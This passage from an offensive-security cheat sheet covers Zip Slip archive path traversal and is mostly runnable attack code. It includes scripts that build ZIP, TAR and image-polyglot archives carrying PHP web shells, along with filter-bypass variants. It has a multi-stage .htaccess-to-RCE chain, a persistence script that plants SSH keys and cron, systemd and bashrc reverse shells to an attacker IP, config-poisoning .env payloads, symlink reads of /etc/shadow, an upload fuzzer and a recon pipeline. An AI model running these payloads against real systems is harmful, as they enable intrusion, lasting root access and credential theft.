  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk
  Content-Length: [calculated]

  ------WebKitFormBoundary7MA4YWxk
  Content-Disposition: form-data; name="file"; filename="data_export.zip"
  Content-Type: application/zip

  [Binary ZIP content with traversal entries]
  ------WebKitFormBoundary7MA4YWxk--

  # ── Burp Intruder — Fuzz field names ──
  # Position: name="§file§"
  # Payload list:
  file
  upload
  archive
  zipfile
  import_file
  data
  backup
  attachment
  document
  package

  # ── Burp Intruder — Fuzz Content-Types ──
  # Position: Content-Type: §application/zip§
  # Payload list:
  application/zip
  application/x-zip-compressed
  application/x-zip
  application/octet-stream
  application/x-compressed
  application/gzip
  application/x-tar
  application/x-gzip
  multipart/x-zip
  application/java-archive
  ```
  :::
::

### Verification Commands

::code-group
```bash [Verify File Written]
# ── Check if shell was written ──
curl -s https://target.com/shell.php?cmd=id
curl -s https://target.com/shell.php?cmd=whoami
curl -s https://target.com/cmd.jsp?cmd=id
curl -s https://target.com/cmd.aspx?cmd=whoami

# ── Multiple shell paths to check ──
for path in shell.php cmd.php backdoor.php x.php cmd.jsp shell.jsp cmd.aspx; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/${path}")
    echo "[${STATUS}] https://target.com/${path}"
done

# ── Check with command execution ──
for path in shell.php cmd.php backdoor.php; do
    RESULT=$(curl -s "https://target.com/${path}?cmd=id" 2>/dev/null)
    if echo "$RESULT" | grep -q "uid="; then
        echo "[+] SHELL FOUND: https://target.com/${path}"
        echo "    $RESULT"
    fi
done
```

```bash [Verify via Side Channel]
# ── DNS callback verification ──
# If direct access isn't possible, verify via out-of-band

# PHP payload with DNS callback
python3 -c "
import zipfile
with zipfile.ZipFile('dns_verify.zip','w') as z:
    z.writestr('../../../var/www/html/ping.php',
    '<?php \$_=file_get_contents(\"http://BURP_COLLAB_ID.oastify.com/\".php_uname()); ?>')
"

# Upload and check Burp Collaborator for DNS/HTTP interaction

# ── Time-based verification ──
# PHP sleep payload
python3 -c "
import zipfile
with zipfile.ZipFile('time_verify.zip','w') as z:
    z.writestr('../../../var/www/html/sleep.php','<?php sleep(5); echo \"ok\"; ?>')
"
# Upload, then time the response
time curl -s https://target.com/sleep.php
# If response takes ~5 seconds, file was written

# ── Error-based verification ──
curl -v https://target.com/shell.php 2>&1 | grep -E "200|403|500"
# 200 = file exists and executes
# 403 = file exists but blocked
# 500 = file exists but has error
# 404 = file not written
```

```bash [Read Exfiltrated Files]
# If symlink attack was used to exfil files
# The extracted archive may contain the linked file content

# Download the processed/returned archive
curl -s https://target.com/api/download/processed -o result.zip

# Extract and read symlinked content
unzip result.zip
cat passwd_link    # Contains /etc/passwd content

# For TAR
tar xzf result.tar.gz
cat shadow_link    # Contains /etc/shadow content
```
::

---

## Filter Bypass Techniques

::warning
Applications may implement various defenses against Zip Slip. Each defense has known bypass strategies.
::

### Path Sanitization Bypasses

::accordion
  :::accordion-item{icon="i-lucide-shield-off" label="Encoding & Normalization Bypasses"}
  ```python [encoding_bypasses.py]
  #!/usr/bin/env python3
  """Path traversal encoding bypasses for Zip Slip"""
  import zipfile
  import struct

  shell = b'<?php system($_GET["cmd"]); ?>'

  bypasses = {
      # Standard traversal
      "standard": "../../../var/www/html/s1.php",
      
      # Double encoding
      "double_dot_encoded": "..%252f..%252f..%252fvar/www/html/s2.php",
      
      # URL encoding
      "url_encoded": "..%2f..%2f..%2fvar/www/html/s3.php",
      
      # Backslash (Windows path on Linux)
      "backslash": "..\\..\\..\\var\\www\\html\\s4.php",
      
      # Mixed separators
      "mixed_sep": "../..\\../var/www\\html/s5.php",
      
      # Double dot variations
      "dot_dot_slash": "....//....//....//var/www/html/s6.php",
      
      # Null byte (legacy systems)
      "null_byte": "../../../var/www/html/s7.php\x00.txt",
      
      # Unicode normalization
      "unicode_dot": "\u002e\u002e/\u002e\u002e/\u002e\u002e/var/www/html/s8.php",
      
      # Overlong UTF-8 dot (0x2e as 2-byte)
      "overlong_utf8": "\xc0\xae\xc0\xae/\xc0\xae\xc0\xae/\xc0\xae\xc0\xae/var/www/html/s9.php",
      
      # Leading slash
      "absolute_path": "/var/www/html/s10.php",
      
      # Current directory bypass
      "current_dir": "./../../../var/www/html/s11.php",
      
      # Trailing spaces/dots (Windows)
      "trailing_dot": "../../../var/www/html/s12.php.",
      "trailing_space": "../../../var/www/html/s13.php ",
      
      # Long path (potential buffer issues)
      "long_path": ("../" * 50) + "var/www/html/s14.php",
      
      # Case variations (Windows)
      "case_variation": "..\\..\\..\\VAR\\WWW\\HTML\\s15.php",
  }

  for name, path in bypasses.items():
      try:
          fname = f"bypass_{name}.zip"
          with zipfile.ZipFile(fname, 'w') as zf:
              zf.writestr("legit.txt", "normal file")
              zf.writestr(path, shell)
          print(f"[+] {name}: {fname} -> {path}")
      except Exception as e:
          print(f"[-] {name}: Failed — {e}")
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="Raw ZIP Binary Manipulation"}
  ```python [raw_zip_manipulation.py]
  #!/usr/bin/env python3
  """
  Directly manipulate ZIP binary structure to bypass sanitization.
  Some libraries validate during ZipFile.writestr() but the actual
  ZIP format allows arbitrary filenames in the central directory.
  """
  import struct
  import zlib

  def create_raw_zip(output_path, entries):
      """Create ZIP file by manually writing binary structure"""
      central_dir = b""
      local_headers = b""
      offset = 0
      
      for filename, content in entries:
          fname_bytes = filename.encode('utf-8') if isinstance(filename, str) else filename
          content_bytes = content.encode('utf-8') if isinstance(content, str) else content
          
          # Compress content
          compressed = zlib.compress(content_bytes)
          crc = zlib.crc32(content_bytes) & 0xffffffff
          
          # Local file header
          local = struct.pack('<4sHHHHHIIIHH',
              b'PK\x03\x04',    # signature
              20,                # version needed
              0,                 # flags
              8,                 # compression (deflate)
              0,                 # mod time
              0,                 # mod date
              crc,               # crc-32
              len(compressed),   # compressed size
              len(content_bytes),# uncompressed size
              len(fname_bytes),  # filename length
              0                  # extra field length
          )
          local += fname_bytes + compressed
          
          # Central directory header
          central = struct.pack('<4sHHHHHHIIIHHHHHII',
              b'PK\x01\x02',    # signature
              20,                # version made by
              20,                # version needed
              0,                 # flags
              8,                 # compression
              0,                 # mod time
              0,                 # mod date
              crc,               # crc-32
              len(compressed),   # compressed size
              len(content_bytes),# uncompressed size
              len(fname_bytes),  # filename length
              0,                 # extra field length
              0,                 # file comment length
              0,                 # disk number start
              0,                 # internal attributes
              0o100755 << 16,    # external attributes
              offset             # relative offset
          )
          central += fname_bytes
          
          central_dir += central
          local_headers += local
          offset += len(local)
      
      # End of central directory
      eocd = struct.pack('<4sHHHHIIH',
          b'PK\x05\x06',        # signature
          0,                     # disk number
          0,                     # disk with central dir
          len(entries),          # entries on disk
          len(entries),          # total entries
          len(central_dir),      # central dir size
          offset,                # central dir offset
          0                      # comment length
      )
      
      with open(output_path, 'wb') as f:
          f.write(local_headers + central_dir + eocd)
      
      print(f"[+] Raw ZIP created: {output_path}")

  # Create ZIP with raw binary filename that may bypass string-level filters
  create_raw_zip("raw_bypass.zip", [
      ("legit.txt", "Normal file"),
      ("../../../var/www/html/raw_shell.php", '<?php system($_GET["cmd"]); ?>'),
  ])

  # Filename with null bytes embedded
  create_raw_zip("nullbyte_bypass.zip", [
      ("../../../var/www/html/null.php\x00.jpg", '<?php system($_GET["cmd"]); ?>'),
  ])
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="Filename Collision Attacks"}
  ```python [collision_bypass.py]
  #!/usr/bin/env python3
  """
  Exploit race conditions and entry ordering in ZIP extraction.
  Some extractors process entries sequentially — we can exploit this.
  """
  import zipfile

  shell = '<?php system($_GET["cmd"]); ?>'

  # ── Entry ordering attack ──
  # First entry creates directory, second writes through it
  with zipfile.ZipFile("order_attack.zip", 'w') as zf:
      # Entry 1: Create a "safe" looking directory structure
      zf.writestr("uploads/data/config.json", '{"version":"1.0"}')
      
      # Entry 2: Traversal that might bypass pre-scan but execute during extraction
      zf.writestr("uploads/../../var/www/html/shell.php", shell)
      
      # Entry 3: Another safe file (some validators only check first/last)
      zf.writestr("uploads/data/readme.txt", "Safe file")

  print("[+] Created order_attack.zip")

  # ── Duplicate entry attack ──
  # Some extractors handle duplicates differently
  with zipfile.ZipFile("duplicate_attack.zip", 'w') as zf:
      # First: safe version of filename
      zf.writestr("config.php", '<?php // safe config ?>')
      
      # Second: same filename with traversal (may override first)
      zf.writestr("../../../var/www/html/config.php", shell)

  print("[+] Created duplicate_attack.zip")

  # ── Very deep nesting (stack exhaustion on validators) ──
  deep_path = "/".join(["a"] * 200) + "/shell.php"
  with zipfile.ZipFile("deep_nest.zip", 'w') as zf:
      zf.writestr(deep_path, shell)
      zf.writestr("../" * 205 + "var/www/html/deep.php", shell)

  print("[+] Created deep_nest.zip")

  # ── Mixed absolute and relative ──
  with zipfile.ZipFile("mixed_paths.zip", 'w') as zf:
      zf.writestr("normal.txt", "safe")
      zf.writestr("/var/www/html/abs_shell.php", shell)  # Absolute path
      zf.writestr("./../../var/www/html/rel_shell.php", shell)  # Relative with ./

  print("[+] Created mixed_paths.zip")
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="Archive Format Switching"}
  ```bash
  # If ZIP is validated but other formats aren't

  # ── Try TAR instead of ZIP ──
  python3 -c "
  import tarfile, io
  with tarfile.open('evil.tar.gz','w:gz') as t:
      i=tarfile.TarInfo('../../../var/www/html/shell.php')
      d=b'<?php system(\$_GET[\"c\"]); ?>'
      i.size=len(d)
      t.addfile(i,io.BytesIO(d))
  "

  # ── Try JAR (same as ZIP but different extension) ──
  cp evil.zip evil.jar

  # ── Try WAR ──
  cp evil.zip evil.war

  # ── Try CPIO ──
  echo '<?php system($_GET["cmd"]); ?>' > '../../../var/www/html/shell.php'
  find . -name 'shell.php' | cpio -o > evil.cpio

  # ── Try 7z ──
  # 7z doesn't natively support path traversal in most tools
  # but some extractors don't validate 7z entries either

  # ── Try ARJ ──
  # Legacy format sometimes accepted

  # ── Rename extensions ──
  cp evil.zip evil.xlsx   # Office files are ZIPs
  cp evil.zip evil.docx
  cp evil.zip evil.pptx
  cp evil.zip evil.apk
  cp evil.zip evil.xpi    # Firefox extensions
  cp evil.zip evil.crx    # Chrome extensions
  cp evil.zip evil.epub
  cp evil.zip evil.odt
  ```
  :::
::

### Content-Type & Extension Bypasses

::code-group
```bash [Content-Type Fuzzing]
# ── Try different Content-Types for the upload ──
for CT in \
  "application/zip" \
  "application/x-zip-compressed" \
  "application/x-zip" \
  "application/octet-stream" \
  "application/x-compressed" \
  "multipart/x-zip" \
  "application/x-tar" \
  "application/gzip" \
  "application/x-gzip" \
  "application/x-bzip2" \
  "application/java-archive" \
  "application/x-rar-compressed" \
  "application/x-7z-compressed" \
  "binary/octet-stream" \
  "application/force-download"; do
    echo "[*] Trying: $CT"
    curl -s -o /dev/null -w "%{http_code}" -X POST \
      https://target.com/api/upload \
      -F "file=@evil.zip;type=${CT}" \
      -H "Cookie: session=TOKEN"
    echo ""
done
```

```bash [Extension Bypass]
# ── Rename archive with accepted extensions ──
cp evil.zip evil.ZIP
cp evil.zip evil.Zip
cp evil.zip evil.zip.bak
cp evil.zip evil.zip.tmp
cp evil.zip evil.archive
cp evil.zip evil.backup
cp evil.zip evil.dat
cp evil.zip evil.bin

# ── Double extensions ──
cp evil.zip evil.zip.zip
cp evil.zip evil.tar.zip
cp evil.zip evil.csv.zip

# ── Office format disguise (OOXML is ZIP) ──
cp evil.zip evil.xlsx
cp evil.zip evil.docx
cp evil.zip evil.pptx

# Upload each variant
for f in evil.*; do
    echo "[*] Uploading: $f"
    curl -s -o /dev/null -w "%{http_code}" -X POST \
      https://target.com/api/upload \
      -F "file=@${f}" \
      -H "Cookie: session=TOKEN"
    echo ""
done
```

```bash [Magic Byte Manipulation]
# ── Prepend valid magic bytes if server checks them ──
# ZIP magic: PK\x03\x04 (50 4B 03 04)
# Already present in valid ZIP files

# ── Create polyglot: JPEG header + ZIP ──
python3 -c "
import zipfile, io, struct

# JPEG header
jpg_header = bytes([0xFF, 0xD8, 0xFF, 0xE0])

# Create ZIP in memory
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as zf:
    zf.writestr('../../../var/www/html/shell.php', '<?php system(\$_GET[\"c\"]); ?>')
    zf.writestr('image.jpg', 'fake image content')
zip_data = buf.getvalue()

# Polyglot: JPEG header + ZIP
with open('polyglot.jpg', 'wb') as f:
    f.write(jpg_header + zip_data)

print('[+] Created polyglot.jpg (JPEG+ZIP)')
"

# ── GIF header + ZIP ──
python3 -c "
import zipfile, io
gif_header = b'GIF89a'
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as zf:
    zf.writestr('../../../var/www/html/shell.php', '<?php system(\$_GET[\"c\"]); ?>')
with open('polyglot.gif', 'wb') as f:
    f.write(gif_header + buf.getvalue())
print('[+] Created polyglot.gif (GIF+ZIP)')
"

# ── PNG header + ZIP ──
python3 -c "
import zipfile, io
png_header = b'\\x89PNG\\r\\n\\x1a\\n'
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as zf:
    zf.writestr('../../../var/www/html/shell.php', '<?php system(\$_GET[\"c\"]); ?>')
with open('polyglot.png', 'wb') as f:
    f.write(png_header + buf.getvalue())
print('[+] Created polyglot.png (PNG+ZIP)')
"
```
::

---

## Exploitation Chains

::tip
Zip Slip becomes significantly more impactful when chained with other vulnerabilities or used to establish persistence through multiple vectors simultaneously.
::

### Chain Diagrams

::card-group
  :::card
  ---
  icon: i-lucide-link
  title: Zip Slip → RCE via Webshell
  ---
  1. Upload ZIP with `../../../var/www/html/shell.php`
  2. Server extracts archive without path validation
  3. `shell.php` written to web document root
  4. Access `https://target.com/shell.php?cmd=id`
  5. Full Remote Code Execution achieved
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Zip Slip → SSH Access
  ---
  1. Generate SSH keypair: `ssh-keygen -t rsa`
  2. Craft ZIP with `../../../../../root/.ssh/authorized_keys`
  3. Upload and trigger extraction
  4. Connect: `ssh -i id_rsa root@target.com`
  5. Persistent root shell access
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Zip Slip → Config Poisoning → RCE
  ---
  1. Overwrite `.env` with attacker-controlled database host
  2. Application connects to attacker's database
  3. Serve malicious data that triggers deserialization/SSTI
  4. Chain to RCE through the application itself
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Zip Slip → Cron → Reverse Shell
  ---
  1. Upload ZIP with `../../../etc/cron.d/backdoor`
  2. Cron job content: `* * * * * root bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'`
  3. Wait up to 60 seconds
  4. Receive reverse shell as root
  5. No web-accessible file needed
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Zip Slip → Symlink → File Read → Password Crack
  ---
  1. Upload TAR with symlink to `/etc/shadow`
  2. Application serves or returns extracted content
  3. Download shadow file through application
  4. Crack hashes: `john --wordlist=rockyou.txt shadow`
  5. Login with cracked credentials
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Zip Slip → htaccess → PHP Upload → RCE
  ---
  1. First ZIP overwrites `.htaccess` to allow PHP execution from `.jpg`
  2. Second ZIP writes `shell.jpg` containing PHP code
  3. Access `https://target.com/uploads/shell.jpg`
  4. PHP executes through the modified handler
  :::
::

### Chain Implementation

::tabs
  :::tabs-item{icon="i-lucide-layers" label="htaccess + Shell Chain"}
  ```python [htaccess_chain.py]
  #!/usr/bin/env python3
  """Two-stage attack: .htaccess override then shell upload"""
  import zipfile
  import requests
  import time

  TARGET = "https://target.com"
  UPLOAD_EP = "/api/upload"
  COOKIE = {"session": "AUTH_TOKEN"}

  # ── Stage 1: Overwrite .htaccess ──
  with zipfile.ZipFile("stage1_htaccess.zip", 'w') as zf:
      zf.writestr("data.csv", "col1,col2\nval1,val2")
      zf.writestr("../../../var/www/html/uploads/.htaccess",
          "AddType application/x-httpd-php .jpg .png .gif .txt\n"
          "Options +ExecCGI\n"
          "php_flag engine on\n"
      )

  print("[*] Stage 1: Uploading .htaccess override")
  r1 = requests.post(f"{TARGET}{UPLOAD_EP}", 
      files={"file": open("stage1_htaccess.zip", "rb")},
      cookies=COOKIE, verify=False)
  print(f"[*] Response: {r1.status_code}")
  time.sleep(2)

  # ── Stage 2: Upload shell disguised as image ──
  with zipfile.ZipFile("stage2_shell.zip", 'w') as zf:
      zf.writestr("images/photo.csv", "image data")
      zf.writestr("../../../var/www/html/uploads/avatar.jpg",
          '<?php echo "<pre>"; system($_GET["cmd"]); echo "</pre>"; ?>'
      )

  print("[*] Stage 2: Uploading shell as .jpg")
  r2 = requests.post(f"{TARGET}{UPLOAD_EP}",
      files={"file": open("stage2_shell.zip", "rb")},
      cookies=COOKIE, verify=False)
  print(f"[*] Response: {r2.status_code}")
  time.sleep(2)

  # ── Stage 3: Execute ──
  print("[*] Stage 3: Executing shell")
  r3 = requests.get(f"{TARGET}/uploads/avatar.jpg", 
      params={"cmd": "id"}, cookies=COOKIE, verify=False)
  if "uid=" in r3.text:
      print(f"[+] RCE ACHIEVED!\n{r3.text}")
  else:
      print(f"[-] Execution failed. Response: {r3.text[:200]}")
  ```
  :::

  :::tabs-item{icon="i-lucide-layers" label="SSH Key + Cron Persistence"}
  ```python [persistence_chain.py]
  #!/usr/bin/env python3
  """Multi-vector persistence: SSH + Cron + Bashrc + Systemd"""
  import zipfile
  import subprocess

  ATTACKER_IP = "10.10.14.1"
  ATTACKER_PORT = "4444"

  # Generate SSH key
  subprocess.run(["ssh-keygen", "-t", "rsa", "-b", "4096", "-f", "zipslip_key", 
                   "-N", "", "-q"], check=True)

  with open("zipslip_key.pub", "r") as f:
      pub_key = f.read().strip()

  with zipfile.ZipFile("full_persistence.zip", 'w') as zf:
      # Decoy
      zf.writestr("config/settings.json", '{"imported": true}')
      
      # ── Vector 1: SSH authorized_keys (root) ──
      zf.writestr(
          "../../../../../root/.ssh/authorized_keys",
          pub_key + "\n"
      )
      
      # ── Vector 2: SSH authorized_keys (common users) ──
      for user in ["ubuntu", "deploy", "app", "www-data", "admin"]:
          zf.writestr(
              f"../../../../../home/{user}/.ssh/authorized_keys",
              pub_key + "\n"
          )
      
      # ── Vector 3: Cron reverse shell ──
      zf.writestr(
          "../../../etc/cron.d/system-update",
          f"* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1'\n"
      )
      
      # ── Vector 4: Bashrc persistence ──
      zf.writestr(
          "../../../../../root/.bashrc",
          f"""# System defaults
  export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
  alias ls='ls --color=auto'
  # System monitoring
  (bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/4445 0>&1' &>/dev/null &)
  """
      )
      
      # ── Vector 5: Systemd service ──
      zf.writestr(
          "../../../etc/systemd/system/system-health.service",
          f"""[Unit]
  Description=System Health Monitor
  After=network.target

  [Service]
  Type=simple
  ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/4446 0>&1'
  Restart=always
  RestartSec=60

  [Install]
  WantedBy=multi-user.target
  """
      )
      
      # ── Vector 6: Profile.d script ──
      zf.writestr(
          "../../../etc/profile.d/system-check.sh",
          f"#!/bin/bash\n(nohup bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/4447 0>&1' &>/dev/null &)\n"
      )

  print("[+] Created full_persistence.zip with 6 persistence vectors")
  print(f"[+] SSH Key: zipslip_key")
  print(f"[+] Listener ports needed: {ATTACKER_PORT}, 4445, 4446, 4447")
  print(f"\n[*] After upload, connect via:")
  print(f"    ssh -i zipslip_key root@target.com")
  print(f"    nc -lvnp {ATTACKER_PORT}")
  ```
  :::

  :::tabs-item{icon="i-lucide-layers" label="Config Overwrite → SSRF/RCE"}
  ```python [config_chain.py]
  #!/usr/bin/env python3
  """Overwrite application config to redirect connections to attacker"""
  import zipfile

  ATTACKER_IP = "10.10.14.1"

  with zipfile.ZipFile("config_poison.zip", 'w') as zf:
      zf.writestr("data/import.csv", "id,name\n1,test")
      
      # ── Laravel .env ──
      zf.writestr("../../../app/.env", f"""
  APP_NAME=PwnedApp
  APP_KEY=base64:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
  APP_DEBUG=true
  APP_URL=http://{ATTACKER_IP}
  DB_CONNECTION=mysql
  DB_HOST={ATTACKER_IP}
  DB_PORT=3306
  DB_DATABASE=app
  DB_USERNAME=root
  DB_PASSWORD=
  REDIS_HOST={ATTACKER_IP}
  REDIS_PORT=6379
  MAIL_MAILER=smtp
  MAIL_HOST={ATTACKER_IP}
  MAIL_PORT=25
  AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
  AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/bPxRfiCYEXAMPLEKEY
  AWS_DEFAULT_REGION=us-east-1
  AWS_BUCKET=app-bucket
  AWS_ENDPOINT=http://{ATTACKER_IP}:9000
  """)
      
      # ── Django settings.py ──
      zf.writestr("../../../app/app/settings.py", f"""
  import os
  SECRET_KEY = 'attacker-controlled-secret-key-for-deserialization'
  DEBUG = True
  ALLOWED_HOSTS = ['*']
  DATABASES = {{
      'default': {{
          'ENGINE': 'django.db.backends.postgresql',
          'NAME': 'app',
          'USER': 'postgres',
          'PASSWORD': '',
          'HOST': '{ATTACKER_IP}',
          'PORT': '5432',
      }}
  }}
  CACHES = {{
      'default': {{
          'BACKEND': 'django.core.cache.backends.memcached.PyMemcacheCache',
          'LOCATION': '{ATTACKER_IP}:11211',
      }}
  }}
  """)

      # ── Node.js .env ──
      zf.writestr("../../../app/.env", f"""
  DATABASE_URL=postgresql://attacker:{ATTACKER_IP}:5432/exfil
  REDIS_URL=redis://{ATTACKER_IP}:6379
  SESSION_SECRET=attacker_controlled
  JWT_SECRET=attacker_controlled_jwt
  API_KEY=attacker_controlled_api_key
  WEBHOOK_URL=http://{ATTACKER_IP}:8080/webhook
  """)

  print("[+] Created config_poison.zip")
  print(f"[*] Start listeners on {ATTACKER_IP}:")
  print(f"    MySQL:    nc -lvnp 3306")
  print(f"    Postgres: nc -lvnp 5432")
  print(f"    Redis:    nc -lvnp 6379")
  print(f"    SMTP:     nc -lvnp 25")
  print(f"    HTTP:     python3 -m http.server 8080")
  ```
  :::
::

---

## Automated Scanning Tools

### Dedicated Zip Slip Tools

::tabs
  :::tabs-item{icon="i-lucide-scan" label="zip-slip-scanner"}
  ```bash
  # ── snyk/zip-slip-vulnerability scanner ──
  # https://github.com/snyk/zip-slip-vulnerability
  git clone https://github.com/snyk/zip-slip-vulnerability.git
  cd zip-slip-vulnerability

  # Check if an archive contains traversal entries
  python3 -c "
  import zipfile, tarfile, sys

  def scan_zip(path):
      with zipfile.ZipFile(path) as zf:
          for info in zf.infolist():
              if '..' in info.filename or info.filename.startswith('/'):
                  print(f'[!] VULNERABLE ENTRY: {info.filename}')

  def scan_tar(path):
      with tarfile.open(path) as tf:
          for member in tf.getmembers():
              if '..' in member.name or member.name.startswith('/'):
                  print(f'[!] VULNERABLE ENTRY: {member.name}')
              if member.issym() or member.islnk():
                  print(f'[!] SYMLINK/HARDLINK: {member.name} -> {member.linkname}')

  scan_zip(sys.argv[1]) if sys.argv[1].endswith('.zip') else scan_tar(sys.argv[1])
  " target_archive.zip
  ```
  :::

  :::tabs-item{icon="i-lucide-scan" label="Custom Fuzzer"}
  ```python [zipslip_fuzzer.py]
  #!/usr/bin/env python3
  """
  Automated Zip Slip fuzzer — tests multiple traversal variations
  against a target upload endpoint
  """
  import zipfile
  import requests
  import time
  import sys
  import os

  class ZipSlipFuzzer:
      def __init__(self, target_url, upload_field="file", cookies=None, headers=None):
          self.target_url = target_url
          self.upload_field = upload_field
          self.session = requests.Session()
          self.session.verify = False
          if cookies:
              self.session.cookies.update(cookies)
          if headers:
              self.session.headers.update(headers)
          
          self.results = []
      
      def generate_payloads(self, depth_range=(1, 10)):
          """Generate traversal path variations"""
          targets = [
              ("var/www/html", "probe_{n}.php", "<?php echo 'ZIPSLIP_PROBE_{n}'; ?>"),
              ("tmp", "probe_{n}.txt", "ZIPSLIP_PROBE_{n}"),
          ]
          
          separators = ["../", "..\\", "..%2f", "..%5c", "....//", "....\\\\"]
          
          payloads = []
          n = 0
          for sep in separators:
              for depth in range(depth_range[0], depth_range[1] + 1):
                  for target_dir, filename_tpl, content_tpl in targets:
                      n += 1
                      traversal = sep * depth + target_dir + "/" + filename_tpl.format(n=n)
                      content = content_tpl.format(n=n)
                      payloads.append({
                          "traversal": traversal,
                          "content": content,
                          "separator": sep,
                          "depth": depth,
                          "id": n
                      })
          
          return payloads
      
      def create_archive(self, traversal_path, content, archive_type="zip"):
          """Create a single malicious archive"""
          import io
          import tarfile
          
          buf = io.BytesIO()
          
          if archive_type == "zip":
              with zipfile.ZipFile(buf, 'w') as zf:
                  zf.writestr("data.txt", "legitimate content")
                  zf.writestr(traversal_path, content)
          elif archive_type == "tar":
              with tarfile.open(fileobj=buf, mode='w:gz') as tf:
                  info = tarfile.TarInfo(name=traversal_path)
                  data = content.encode()
                  info.size = len(data)
                  tf.addfile(info, io.BytesIO(data))
          
          buf.seek(0)
          return buf
      
      def fuzz(self, archive_types=["zip", "tar"], delay=0.5):
          """Run the fuzzer"""
          payloads = self.generate_payloads()
          total = len(payloads) * len(archive_types)
          
          print(f"[*] Starting Zip Slip fuzzer")
          print(f"[*] Target: {self.target_url}")
          print(f"[*] Total payloads: {total}")
          print(f"[*] Archive types: {archive_types}")
          print("-" * 60)
          
          for i, payload in enumerate(payloads):
              for atype in archive_types:
                  try:
                      archive = self.create_archive(
                          payload["traversal"],
                          payload["content"],
                          atype
                      )
                      
                      ext = "zip" if atype == "zip" else "tar.gz"
                      files = {
                          self.upload_field: (f"data.{ext}", archive, 
                              "application/zip" if atype == "zip" else "application/gzip")
                      }
                      
                      r = self.session.post(self.target_url, files=files)
                      
                      result = {
                          "payload": payload,
                          "type": atype,
                          "status": r.status_code,
                          "response_len": len(r.text),
                          "success_indicators": any(x in r.text.lower() for x in 
                              ["success", "uploaded", "extracted", "imported", "processed"])
                      }
                      
                      self.results.append(result)
                      
                      indicator = "✓" if result["success_indicators"] else "✗"
                      print(f"  [{indicator}] [{r.status_code}] sep={payload['separator']!r} "
                            f"depth={payload['depth']} type={atype}")
                      
                  except Exception as e:
                      print(f"  [E] Error: {e}")
                  
                  time.sleep(delay)
          
          self._report()
      
      def _report(self):
          """Print results summary"""
          print("\n" + "=" * 60)
          print("RESULTS SUMMARY")
          print("=" * 60)
          
          successful = [r for r in self.results if r["success_indicators"]]
          
          if successful:
              print(f"\n[+] {len(successful)} potentially successful uploads:")
              for r in successful:
                  p = r["payload"]
                  print(f"    Separator: {p['separator']!r}")
                  print(f"    Depth: {p['depth']}")
                  print(f"    Type: {r['type']}")
                  print(f"    Path: {p['traversal']}")
                  print(f"    Status: {r['status']}")
                  print()
          else:
              print("\n[-] No successful uploads detected")

  # ── Usage ──
  if __name__ == "__main__":
      fuzzer = ZipSlipFuzzer(
          target_url="https://target.com/api/upload",
          upload_field="file",
          cookies={"session": "YOUR_AUTH_TOKEN"},
          headers={"X-Requested-With": "XMLHttpRequest"}
      )
      fuzzer.fuzz(archive_types=["zip", "tar"], delay=1)
  ```
  :::

  :::tabs-item{icon="i-lucide-scan" label="Nuclei Templates"}
  ```yaml [zipslip-detect.yaml]
  id: zip-slip-upload
  info:
    name: Zip Slip Path Traversal via Archive Upload
    author: bughunter
    severity: critical
    tags: file-upload,zip-slip,rce
    reference:
      - https://security.snyk.io/research/zip-slip-vulnerability
      - https://github.com/snyk/zip-slip-vulnerability

  # Note: Nuclei has limited support for file upload testing
  # Use this template to detect upload endpoints, then test manually

  http:
    - method: GET
      path:
        - "{{BaseURL}}/api/upload"
        - "{{BaseURL}}/api/import"
        - "{{BaseURL}}/upload"
        - "{{BaseURL}}/admin/upload"
        - "{{BaseURL}}/admin/restore"
        - "{{BaseURL}}/admin/import"
        - "{{BaseURL}}/settings/import"
        - "{{BaseURL}}/api/v1/upload"
        - "{{BaseURL}}/api/v2/upload"
        - "{{BaseURL}}/api/files"
        - "{{BaseURL}}/api/archive"
        - "{{BaseURL}}/backup/upload"
        - "{{BaseURL}}/migration/import"
      matchers-condition: or
      matchers:
        - type: status
          status:
            - 200
            - 301
            - 302
            - 405
        - type: word
          words:
            - "upload"
            - "import"
            - "multipart"
            - "file"
            - "archive"
          condition: or
  ```
  :::
::

### Integration with Bug Bounty Tools

::code-group
```bash [Recon Pipeline]
# ── Full recon pipeline for Zip Slip targets ──

# Step 1: Subdomain enumeration
subfinder -d target.com -silent | httpx -silent -o live_hosts.txt

# Step 2: Crawl all hosts for upload endpoints
cat live_hosts.txt | while read host; do
    katana -u "$host" -d 4 -jc -kf -ef css,js,png,jpg,gif \
      -f qurl 2>/dev/null
done | sort -u | tee all_urls.txt

# Step 3: Filter for upload/import endpoints
grep -iE "upload|import|extract|restore|backup|migrate|archive|decompress|unzip" \
  all_urls.txt | sort -u > upload_endpoints.txt

# Step 4: Check which endpoints accept POST
cat upload_endpoints.txt | while read url; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$url" \
      -F "file=@/dev/null" 2>/dev/null)
    if [ "$STATUS" != "404" ] && [ "$STATUS" != "000" ]; then
        echo "[${STATUS}] $url"
    fi
done | tee active_upload_endpoints.txt

# Step 5: Technology detection for each
cat active_upload_endpoints.txt | awk '{print $2}' | while read url; do
    BASE=$(echo "$url" | grep -oP 'https?://[^/]+')
    echo "--- $BASE ---"
    whatweb "$BASE" 2>/dev/null | head -1
done

echo "[*] Review active_upload_endpoints.txt and test each with Zip Slip payloads"
```

```bash [Burp Extension Workflow]
